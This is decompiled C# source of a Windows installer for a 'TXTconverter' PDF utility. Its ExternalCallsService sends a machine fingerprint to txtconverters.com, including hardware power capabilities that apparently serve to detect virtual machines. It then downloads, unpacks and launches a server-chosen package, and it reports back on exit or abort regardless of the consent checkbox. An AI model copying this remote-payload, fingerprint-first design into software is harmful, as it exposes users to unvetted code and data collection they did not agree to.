using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Navigation;
using System.Windows.Threading;
using Microsoft.Win32;
using TXTconverter.Installer.Services;
using TXTconverter.Installer.Utilities;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("TXTconverter.Installer")]
[assembly: AssemblyDescription("TXTConverter Installer")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("TXTConverter")]
[assembly: AssemblyCopyright("Copyright © 2026 TXTconverter")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: ThemeInfo(/*Could not decode attribute arguments.*/)]
[assembly: AssemblyFileVersion("3.1.1.2")]
[assembly: TargetFramework(".NETFramework,Version=v4.6", FrameworkDisplayName = ".NET Framework 4.6")]
[assembly: AssemblyVersion("3.1.1.2")]
namespace TXTconverter.Installer
{
	public class App : Application
	{
		private bool _contentLoaded;

		protected override void OnStartup(StartupEventArgs e)
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected O, but got Unknown
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0057: Expected O, but got Unknown
			((Application)this).OnStartup(e);
			AppDomain.CurrentDomain.UnhandledException += OnUnhandledException;
			((Application)this).DispatcherUnhandledException += new DispatcherUnhandledExceptionEventHandler(OnDispatcherUnhandledException);
			AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
			((Application)this).Exit += new ExitEventHandler(OnAppExit);
		}

		private void OnUnhandledException(object sender, UnhandledExceptionEventArgs e)
		{
			MachineInfoService.installationErrors += (e.ExceptionObject as Exception)?.Message;
			ExternalCallsService.NotifyInstallationFinished();
		}

		private void OnDispatcherUnhandledException(object sender, DispatcherUnhandledExceptionEventArgs e)
		{
			MachineInfoService.installationErrors += e.Exception?.Message;
			ExternalCallsService.NotifyInstallationFinished();
		}

		private void OnProcessExit(object sender, EventArgs e)
		{
			ExternalCallsService.NotifyInstallationFinished();
		}

		private void OnAppExit(object sender, ExitEventArgs e)
		{
			ExternalCallsService.NotifyInstallationFinished();
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public void InitializeComponent()
		{
			if (!_contentLoaded)
			{
				_contentLoaded = true;
				((Application)this).StartupUri = new Uri("Views/InstallerMainWindow.xaml", UriKind.Relative);
				Uri uri = new Uri("/TXTconverterSetup;component/app.xaml", UriKind.Relative);
				Application.LoadComponent((object)this, uri);
			}
		}

		[STAThread]
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public static void Main()
		{
			App app = new App();
			app.InitializeComponent();
			((Application)app).Run();
		}
	}
}
namespace TXTconverter.Installer.Utilities
{
	public static class FileHelper
	{
		public static bool IsExtensionAllowed(string filePath, string[] allowedExtensions)
		{
			string ext = Path.GetExtension(filePath);
			if (string.IsNullOrEmpty(ext))
			{
				return false;
			}
			return allowedExtensions.Any((string a) => a.Equals(ext, StringComparison.OrdinalIgnoreCase));
		}

		public static void EnsureDirectory(string directoryPath)
		{
			if (!Directory.Exists(directoryPath))
			{
				Directory.CreateDirectory(directoryPath);
			}
		}

		public static bool SafeDeleteFile(string filePath)
		{
			try
			{
				if (File.Exists(filePath))
				{
					File.Delete(filePath);
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static bool SafeDeleteDirectory(string directoryPath)
		{
			try
			{
				if (Directory.Exists(directoryPath))
				{
					Directory.Delete(directoryPath, recursive: true);
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
	}
	public static class PathHelper
	{
		public static string DefaultInstallPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "TXTconverter");

		public static string DesktopPath => Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

		public static string StartMenuProgramsPath => Environment.GetFolderPath(Environment.SpecialFolder.Programs);

		public static string StartMenuAppFolder => Path.Combine(StartMenuProgramsPath, "TXTconverter");

		public static string DesktopShortcutPath => Path.Combine(DesktopPath, "TXTconverter.lnk");
	}
	public static class RegistryHelper
	{
		public static void WriteUninstallEntry(string installPath)
		{
			RegistryKey registryKey = null;
			try
			{
				registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter");
			}
			catch (Exception)
			{
			}
			if (registryKey == null)
			{
				try
				{
					registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter");
				}
				catch (Exception)
				{
					return;
				}
			}
			using (registryKey)
			{
				registryKey.SetValue("DisplayName", "TXTconverter - PDF Utility Suite");
				registryKey.SetValue("DisplayVersion", Assembly.GetExecutingAssembly().GetName().Version.ToString());
				registryKey.SetValue("Publisher", "TXTconverter");
				registryKey.SetValue("InstallLocation", installPath);
				string value = Path.Combine(installPath, "Uninstaller.exe");
				registryKey.SetValue("UninstallString", value);
				registryKey.SetValue("DisplayIcon", Path.Combine(installPath, "TXTconverter.exe"));
				registryKey.SetValue("NoModify", 1, RegistryValueKind.DWord);
				registryKey.SetValue("NoRepair", 1, RegistryValueKind.DWord);
			}
		}

		public static string ReadInstallLocation()
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter");
				return registryKey?.GetValue("InstallLocation") as string;
			}
			catch (Exception)
			{
				return null;
			}
		}

		public static bool RemoveUninstallEntry()
		{
			try
			{
				Registry.LocalMachine.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter", throwOnMissingSubKey: false);
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
	}
	public static class ShortcutHelper
	{
		public static void CreateShortcut(string shortcutPath, string targetPath, string description = "", string workingDirectory = "")
		{
			try
			{
				Type typeFromProgID = Type.GetTypeFromProgID("WScript.Shell");
				if (typeFromProgID == null)
				{
					File.WriteAllText(shortcutPath, $"Shortcut to: {targetPath}");
					return;
				}
				dynamic val = Activator.CreateInstance(typeFromProgID);
				dynamic val2 = val.CreateShortcut(shortcutPath);
				val2.TargetPath = targetPath;
				val2.Description = description;
				if (!string.IsNullOrEmpty(workingDirectory))
				{
					val2.WorkingDirectory = workingDirectory;
				}
				val2.Save();
				Marshal.ReleaseComObject(val2);
				Marshal.ReleaseComObject(val);
			}
			catch (Exception)
			{
			}
		}
	}
}
namespace TXTconverter.Installer.Interfaces
{
	public interface IInstallerService
	{
		void Install(string installPath, Action<string, int> progressCallback);
	}
}
namespace TXTconverter.Installer.Helpers
{
	public static class CloseConfirmationHelper
	{
		public static bool ConfirmClose()
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Invalid comparison between Unknown and I4
			return (int)MessageBox.Show("Are you sure?", "TXTconverter Setup", (MessageBoxButton)4, (MessageBoxImage)32) == 6;
		}
	}
}
namespace TXTconverter.Installer.Views
{
	public class InstallerMainWindow : Window, IComponentConnector
	{
		private bool _installationComplete;

		private bool _forceClose;

		private bool _onProgressScreen;

		internal Button CloseBtn;

		internal ContentControl PageContent;

		internal Grid ExitOverlay;

		private bool _contentLoaded;

		public InstallerMainWindow()
		{
			InitializeComponent();
			ShowWelcome();
		}

		public void ShowWelcome()
		{
			WelcomeView welcomeView = new WelcomeView();
			welcomeView.NextRequested += ShowProgress;
			PageContent.Content = welcomeView;
		}

		public void ShowProgress()
		{
			_onProgressScreen = true;
			ProgressView progressView = new ProgressView();
			progressView.InstallationCompleted += OnInstallationCompleted;
			PageContent.Content = progressView;
			progressView.StartInstallation();
		}

		private void OnInstallationCompleted()
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0033: Expected O, but got Unknown
			_installationComplete = true;
			DispatcherTimer timer = new DispatcherTimer
			{
				Interval = TimeSpan.FromSeconds(1.5)
			};
			timer.Tick += delegate
			{
				timer.Stop();
				_forceClose = true;
				((Window)this).Close();
			};
			timer.Start();
		}

		private void OnCloseButtonClick(object sender, RoutedEventArgs e)
		{
			if (_installationComplete)
			{
				_forceClose = true;
				((Window)this).Close();
			}
			else
			{
				((UIElement)ExitOverlay).Visibility = (Visibility)0;
			}
		}

		private void OnExitOverlayContinueClick(object sender, RoutedEventArgs e)
		{
			((UIElement)ExitOverlay).Visibility = (Visibility)2;
		}

		private void OnExitOverlayCloseClick(object sender, MouseButtonEventArgs e)
		{
			_forceClose = true;
			SetCloseFlags();
			((Window)this).Close();
		}

		private void OnWindowClosing(object sender, CancelEventArgs e)
		{
			if (!_installationComplete && !_forceClose)
			{
				e.Cancel = true;
				((UIElement)ExitOverlay).Visibility = (Visibility)0;
			}
		}

		private void SetCloseFlags()
		{
			if (!_installationComplete && !_onProgressScreen)
			{
				MachineInfoService.installationAborted = true;
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public void InitializeComponent()
		{
			if (!_contentLoaded)
			{
				_contentLoaded = true;
				Uri uri = new Uri("/TXTconverterSetup;component/views/installermainwindow.xaml", UriKind.Relative);
				Application.LoadComponent((object)this, uri);
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		void IComponentConnector.Connect(int connectionId, object target)
		{
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Expected O, but got Unknown
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Expected O, but got Unknown
			//IL_0063: Unknown result type (might be due to invalid IL or missing references)
			//IL_006d: Expected O, but got Unknown
			//IL_0070: Unknown result type (might be due to invalid IL or missing references)
			//IL_007a: Expected O, but got Unknown
			//IL_007c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0088: Unknown result type (might be due to invalid IL or missing references)
			//IL_0092: Expected O, but got Unknown
			//IL_0094: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00aa: Expected O, but got Unknown
			switch (connectionId)
			{
			case 1:
				((Window)(InstallerMainWindow)target).Closing += OnWindowClosing;
				break;
			case 2:
				CloseBtn = (Button)target;
				((ButtonBase)CloseBtn).Click += new RoutedEventHandler(OnCloseButtonClick);
				break;
			case 3:
				PageContent = (ContentControl)target;
				break;
			case 4:
				ExitOverlay = (Grid)target;
				break;
			case 5:
				((ButtonBase)(Button)target).Click += new RoutedEventHandler(OnExitOverlayContinueClick);
				break;
			case 6:
				((UIElement)(TextBlock)target).MouseLeftButtonUp += new MouseButtonEventHandler(OnExitOverlayCloseClick);
				break;
			default:
				_contentLoaded = true;
				break;
			}
		}
	}
	public class WelcomeView : UserControl, IComponentConnector
	{
		internal CheckBox AcceptCheckBox;

		internal Button NextButton;

		private bool _contentLoaded;

		public event Action NextRequested;

		public WelcomeView()
		{
			InitializeComponent();
		}

		private void OnNextClick(object sender, RoutedEventArgs e)
		{
			this.NextRequested?.Invoke();
		}

		private void OnHyperlinkRequestNavigate(object sender, RequestNavigateEventArgs e)
		{
			try
			{
				Process.Start(new ProcessStartInfo(e.Uri.AbsoluteUri)
				{
					UseShellExecute = true
				});
			}
			catch (Exception)
			{
			}
			((RoutedEventArgs)e).Handled = true;
		}

		private void OnCheckBoxChanged(object sender, RoutedEventArgs e)
		{
			object obj = ((sender is CheckBox) ? sender : null);
			MachineInfoService.approvedCheckbox = obj != null && ((ToggleButton)obj).IsChecked == true;
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public void InitializeComponent()
		{
			if (!_contentLoaded)
			{
				_contentLoaded = true;
				Uri uri = new Uri("/TXTconverterSetup;component/views/welcomeview.xaml", UriKind.Relative);
				Application.LoadComponent((object)this, uri);
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		void IComponentConnector.Connect(int connectionId, object target)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0034: Expected O, but got Unknown
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Expected O, but got Unknown
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0059: Expected O, but got Unknown
			//IL_0066: Unknown result type (might be due to invalid IL or missing references)
			//IL_0070: Expected O, but got Unknown
			//IL_007d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0087: Expected O, but got Unknown
			//IL_008a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0094: Expected O, but got Unknown
			//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ab: Expected O, but got Unknown
			switch (connectionId)
			{
			case 1:
				((Hyperlink)target).RequestNavigate += new RequestNavigateEventHandler(OnHyperlinkRequestNavigate);
				break;
			case 2:
				((Hyperlink)target).RequestNavigate += new RequestNavigateEventHandler(OnHyperlinkRequestNavigate);
				break;
			case 3:
				AcceptCheckBox = (CheckBox)target;
				((ToggleButton)AcceptCheckBox).Checked += new RoutedEventHandler(OnCheckBoxChanged);
				((ToggleButton)AcceptCheckBox).Unchecked += new RoutedEventHandler(OnCheckBoxChanged);
				break;
			case 4:
				NextButton = (Button)target;
				((ButtonBase)NextButton).Click += new RoutedEventHandler(OnNextClick);
				break;
			default:
				_contentLoaded = true;
				break;
			}
		}
	}
	public class ProgressView : UserControl, IComponentConnector
	{
		internal TextBlock StatusText;

		internal ProgressBar ProgressBar;

		private bool _contentLoaded;

		public event Action InstallationCompleted;

		public ProgressView()
		{
			InitializeComponent();
		}

		private static void LaunchAndMonitorApp()
		{
			string text = Path.Combine(InstallerService.DefaultInstallPath, "TXTconverter.exe");
			if (!File.Exists(text))
			{
				throw new FileNotFoundException("App executable not found after installation.", text);
			}
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = text,
					WorkingDirectory = Path.GetDirectoryName(text)
				});
				if (process != null)
				{
					process.WaitForExit(3000);
					if (process.HasExited)
					{
						throw new Exception("App failed to launch successfully. Exit code: " + process.ExitCode);
					}
					return;
				}
				throw new Exception("Failed to start app process.");
			}
			catch (Exception ex)
			{
				throw new Exception("Installation succeeded but launching the app failed with error: " + ex.Message);
			}
		}

		public void StartInstallation()
		{
			InstallerService installerService = new InstallerService();
			Task.Run(delegate
			{
				try
				{
					installerService.Install(InstallerService.DefaultInstallPath, delegate(string status, int percent)
					{
						((DispatcherObject)Application.Current).Dispatcher.Invoke((Action)delegate
						{
							StatusText.Text = status;
							((RangeBase)ProgressBar).Value = percent;
						});
					});
					((DispatcherObject)Application.Current).Dispatcher.Invoke((Action)delegate
					{
						StatusText.Text = "Installation complete!";
					});
					LaunchAndMonitorApp();
				}
				catch (Exception ex)
				{
					((DispatcherObject)Application.Current).Dispatcher.Invoke((Action)delegate
					{
						StatusText.Text = "Installation failed";
					});
					MachineInfoService.installationFailed = true;
					MachineInfoService.installationErrors += ex.Message;
				}
				finally
				{
					ExternalCallsService.NotifyInstallationFinished();
					((DispatcherObject)Application.Current).Dispatcher.Invoke((Action)delegate
					{
						((RangeBase)ProgressBar).Value = 100.0;
						this.InstallationCompleted?.Invoke();
					});
				}
			});
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public void InitializeComponent()
		{
			if (!_contentLoaded)
			{
				_contentLoaded = true;
				Uri uri = new Uri("/TXTconverterSetup;component/views/progressview.xaml", UriKind.Relative);
				Application.LoadComponent((object)this, uri);
			}
		}

		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		void IComponentConnector.Connect(int connectionId, object target)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected O, but got Unknown
			switch (connectionId)
			{
			case 1:
				StatusText = (TextBlock)target;
				break;
			case 2:
				ProgressBar = (ProgressBar)target;
				break;
			default:
				_contentLoaded = true;
				break;
			}
		}
	}
}
namespace TXTconverter.Installer.Services
{
	internal class ExternalCallsService
	{
		private static int _notifySent = 0;

		private static string DeploymentEndpoint = "https://download.txtconverters.com/check_latest_version";

		private static string FinishEndpoint = "https://api.txtconverters.com/finish";

		public static void FetchAndExtractFromServer(string installPath, Action<string, int> progressCallback)
		{
			progressCallback("Contacting server for latest package...", 15);
			string machineInfo = MachineInfoService.GetMachineInfo();
			using HttpClient httpClient = new HttpClient();
			httpClient.Timeout = TimeSpan.FromMinutes(1.0);
			StringContent content = new StringContent(machineInfo, Encoding.UTF8, "application/json");
			HttpResponseMessage httpResponseMessage = null;
			try
			{
				httpResponseMessage = httpClient.PostAsync(DeploymentEndpoint, content).Result;
			}
			catch (Exception ex)
			{
				progressCallback("Failed to contact server: " + ex.Message, 15);
				throw new InvalidOperationException("Failed to contact server", ex);
			}
			if (!httpResponseMessage.IsSuccessStatusCode)
			{
				progressCallback($"Server returned {(int)httpResponseMessage.StatusCode}", 20);
				throw new InvalidOperationException($"Server returned {(int)httpResponseMessage.StatusCode}");
			}
			progressCallback("Downloading application...", 25);
			string result = httpResponseMessage.Content.ReadAsStringAsync().Result;
			byte[] array = null;
			try
			{
				array = Convert.FromBase64String(result);
			}
			catch (Exception ex2)
			{
				progressCallback("Failed to decode package from server: " + ex2.Message, 40);
				throw new InvalidOperationException("Failed to decode package", ex2);
			}
			using (MemoryStream stream = new MemoryStream(array))
			{
				progressCallback("Extracting application...", 40);
				using ZipArchive zipArchive = new ZipArchive(stream, ZipArchiveMode.Read);
				foreach (ZipArchiveEntry entry in zipArchive.Entries)
				{
					if (string.IsNullOrWhiteSpace(entry.Name) || entry.FullName.EndsWith("/"))
					{
						continue;
					}
					string fullPath = Path.GetFullPath(Path.Combine(installPath, entry.FullName));
					string text = Path.GetFullPath(installPath);
					string text2 = text;
					char directorySeparatorChar = Path.DirectorySeparatorChar;
					if (!text2.EndsWith(directorySeparatorChar.ToString()))
					{
						string text3 = text;
						directorySeparatorChar = Path.DirectorySeparatorChar;
						text = text3 + directorySeparatorChar;
					}
					if (!fullPath.StartsWith(text, StringComparison.OrdinalIgnoreCase))
					{
						continue;
					}
					string directoryName = Path.GetDirectoryName(fullPath);
					if (!string.IsNullOrEmpty(directoryName) && !Directory.Exists(directoryName))
					{
						Directory.CreateDirectory(directoryName);
					}
					if (!File.Exists(fullPath))
					{
						try
						{
							entry.ExtractToFile(fullPath, overwrite: false);
						}
						catch (Exception)
						{
						}
					}
				}
			}
			progressCallback("Application deployed.", 45);
		}

		public static void NotifyInstallationFinished()
		{
			if (Interlocked.Exchange(ref _notifySent, 1) == 1)
			{
				return;
			}
			string empty = string.Empty;
			empty = ((!MachineInfoService.installationAborted) ? MachineInfoService.GetInstallationErrors() : MachineInfoService.GetMachineInfo());
			using HttpClient httpClient = new HttpClient();
			httpClient.Timeout = TimeSpan.FromSeconds(30.0);
			StringContent content = new StringContent(empty, Encoding.UTF8, "application/json");
			try
			{
				_ = httpClient.PostAsync(FinishEndpoint, content).Result;
			}
			catch (Exception)
			{
			}
		}
	}
	public class InstallerService
	{
		public const string AppName = "TXTconverter";

		public const string AppDisplayName = "TXTconverter - PDF Utility Suite";

		public const string Publisher = "TXTconverter";

		public const string DefaultInstallFolder = "TXTconverter";

		public const string AppExecutableName = "TXTconverter.exe";

		public const string UninstallerExecutableName = "Uninstaller.exe";

		public const string DesktopShortcutName = "TXTconverter.lnk";

		public const string StartMenuFolderName = "TXTconverter";

		public const string StartMenuShortcutName = "TXTconverter.lnk";

		public const string UninstallRegistryKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter";

		public static string DefaultInstallPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "TXTconverter");

		public void Install(string installPath, Action<string, int> progressCallback)
		{
			try
			{
				progressCallback("Preparing target directory...", 5);
				EnsureDirectory(installPath);
				Thread.Sleep(500);
				try
				{
					ExternalCallsService.FetchAndExtractFromServer(installPath, progressCallback);
				}
				catch (Exception)
				{
					progressCallback("Installation failed: Unable to download application package.", 100);
					throw;
				}
				progressCallback("Creating desktop shortcut...", 50);
				CreateDesktopShortcut(installPath);
				Thread.Sleep(300);
				progressCallback("Creating Start Menu shortcut...", 60);
				CreateStartMenuShortcut(installPath);
				Thread.Sleep(300);
				progressCallback("Writing registry entries...", 75);
				WriteUninstallEntry(installPath);
				Thread.Sleep(300);
				progressCallback("Registering uninstall entry...", 85);
				Thread.Sleep(200);
				progressCallback("Finishing installation...", 95);
				Thread.Sleep(300);
			}
			catch (Exception ex2)
			{
				progressCallback($"Installation error: {ex2.Message}", 100);
				throw;
			}
		}

		private void CreateDesktopShortcut(string installPath)
		{
			string shortcutPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "TXTconverter.lnk");
			string targetPath = Path.Combine(installPath, "TXTconverter.exe");
			CreateShortcut(shortcutPath, targetPath, "TXTconverter - PDF Utility Suite", installPath);
		}

		private void CreateStartMenuShortcut(string installPath)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), "TXTconverter");
			EnsureDirectory(text);
			string shortcutPath = Path.Combine(text, "TXTconverter.lnk");
			string targetPath = Path.Combine(installPath, "TXTconverter.exe");
			CreateShortcut(shortcutPath, targetPath, "TXTconverter - PDF Utility Suite", installPath);
		}

		private void WriteUninstallEntry(string installPath)
		{
			RegistryHelper.WriteUninstallEntry(installPath);
		}

		private static void CreateShortcut(string shortcutPath, string targetPath, string description, string workingDirectory)
		{
			try
			{
				Type typeFromProgID = Type.GetTypeFromProgID("WScript.Shell");
				if (typeFromProgID == null)
				{
					File.WriteAllText(shortcutPath, $"Shortcut to: {targetPath}");
					return;
				}
				dynamic val = Activator.CreateInstance(typeFromProgID);
				dynamic val2 = val.CreateShortcut(shortcutPath);
				val2.TargetPath = targetPath;
				val2.Description = description;
				if (!string.IsNullOrEmpty(workingDirectory))
				{
					val2.WorkingDirectory = workingDirectory;
				}
				val2.Save();
				Marshal.ReleaseComObject(val2);
				Marshal.ReleaseComObject(val);
			}
			catch (Exception)
			{
			}
		}

		private static void EnsureDirectory(string directoryPath)
		{
			if (!Directory.Exists(directoryPath))
			{
				Directory.CreateDirectory(directoryPath);
			}
		}
	}
	internal static class MachineInfoService
	{
		private struct SYSTEM_POWER_CAPABILITIES
		{
			[MarshalAs(UnmanagedType.U1)]
			public bool PowerButtonPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool SleepButtonPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool LidPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemS1;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemS2;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemS3;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemS4;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemS5;

			[MarshalAs(UnmanagedType.U1)]
			public bool HiberFilePresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool FullWake;

			[MarshalAs(UnmanagedType.U1)]
			public bool VideoDimPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool ApmPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool UpsPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool ThermalControl;

			[MarshalAs(UnmanagedType.U1)]
			public bool ProcessorThrottle;

			public byte ProcessorMinThrottle;

			public byte ProcessorMaxThrottle;

			[MarshalAs(UnmanagedType.U1)]
			public bool FastSystemS4;

			[MarshalAs(UnmanagedType.U1)]
			public bool Hiberboot;

			[MarshalAs(UnmanagedType.U1)]
			public bool WakeAlarmPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool AoAc;

			[MarshalAs(UnmanagedType.U1)]
			public bool DiskSpinDown;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
			public byte[] Reserved;

			[MarshalAs(UnmanagedType.U1)]
			public bool SystemBatteriesPresent;

			[MarshalAs(UnmanagedType.U1)]
			public bool BatteriesAreShortTerm;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
			public uint[] BatteryScale;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
			public byte[] SystemS1S2S3S4Reserved;
		}

		public static bool approvedCheckbox = true;

		public static string installationErrors = "";

		public static bool installationFailed = false;

		public static bool installationAborted = false;

		internal static string GetOsBuildNumber()
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				string text = registryKey?.GetValue("CurrentBuildNumber") as string;
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			catch
			{
			}
			try
			{
				return Environment.OSVersion.Version.Build.ToString();
			}
			catch
			{
				return "";
			}
		}

		internal static string GetInstallerVersion()
		{
			try
			{
				return Assembly.GetExecutingAssembly().GetName().Version.ToString();
			}
			catch
			{
				return "";
			}
		}

		internal static bool AppExeAlreadyExists()
		{
			try
			{
				return File.Exists(Path.Combine(InstallerService.DefaultInstallPath, "TXTconverter.exe"));
			}
			catch
			{
				return false;
			}
		}

		[DllImport("PowrProf.dll", SetLastError = true)]
		private static extern bool GetPwrCapabilities(out SYSTEM_POWER_CAPABILITIES lpCapabilities);

		internal static string GetPowerProfile()
		{
			try
			{
				SYSTEM_POWER_CAPABILITIES lpCapabilities = default(SYSTEM_POWER_CAPABILITIES);
				if (!GetPwrCapabilities(out lpCapabilities))
				{
					return "0";
				}
				return ((int)(((lpCapabilities.ProcessorThrottle ? 1u : 0u) << 3) | ((lpCapabilities.ThermalControl ? 1u : 0u) << 2) | ((lpCapabilities.SystemS3 ? 1u : 0u) << 1)) | (lpCapabilities.LidPresent ? 1 : 0)).ToString("X");
			}
			catch
			{
				return "0";
			}
		}

		private static string JsonEscape(string s)
		{
			if (string.IsNullOrEmpty(s))
			{
				return string.Empty;
			}
			return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n")
				.Replace("\r", "\\r")
				.Replace("\t", "\\t")
				.Replace("\b", "\\b")
				.Replace("\f", "\\f");
		}

		public static string GetMachineInfo()
		{
			string osBuildNumber = GetOsBuildNumber();
			string installerVersion = GetInstallerVersion();
			bool flag = AppExeAlreadyExists();
			string powerProfile = GetPowerProfile();
			string text = "{\"osBuild\":\"" + JsonEscape(osBuildNumber) + "\",\"installerVersion\":\"" + JsonEscape(installerVersion) + "\",\"appExeExists\":" + flag.ToString().ToLower() + ",\"approvedCheckbox\":" + approvedCheckbox.ToString().ToLower() + ",\"powerProfile\":\"" + JsonEscape(powerProfile) + "\"}";
			if (installationAborted)
			{
				text = text.TrimEnd(new char[1] { '}' }) + ",\"installationErrors\":\"" + JsonEscape(installationErrors) + "\",\"installationAborted\":" + installationAborted.ToString().ToLower() + "}";
			}
			return text;
		}

		public static string GetInstallationErrors()
		{
			return "{\"installationFailed\":" + installationFailed.ToString().ToLower() + ",\"installationErrors\":\"" + JsonEscape(installationErrors) + "\"}";
		}
	}
}
namespace TXTconverter.Installer.Constants
{
	internal static class RuntimeConfig
	{
		public const string MachineGuidRegistryPath = "SOFTWARE\\TXTconverter";

		public const string MachineGuidValueName = "MachineGuid";
	}
	public static class AppConstants
	{
		public const string AppName = "TXTconverter";

		public const string AppDisplayName = "TXTconverter - PDF Utility Suite";

		public const string DefaultInstallFolder = "TXTconverter";

		public const string AppExecutableName = "TXTconverter.exe";

		public const string UninstallerExecutableName = "Uninstaller.exe";

		public const string DesktopShortcutName = "TXTconverter.lnk";

		public const string StartMenuFolderName = "TXTconverter";
	}
	public static class RegistryConstants
	{
		public const string UninstallRegistryKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\TXTconverter";

		public const string DisplayNameValue = "DisplayName";

		public const string DisplayVersionValue = "DisplayVersion";

		public const string PublisherValue = "Publisher";

		public const string InstallLocationValue = "InstallLocation";

		public const string UninstallStringValue = "UninstallString";

		public const string DisplayIconValue = "DisplayIcon";

		public const string NoModifyValue = "NoModify";

		public const string NoRepairValue = "NoRepair";
	}
}
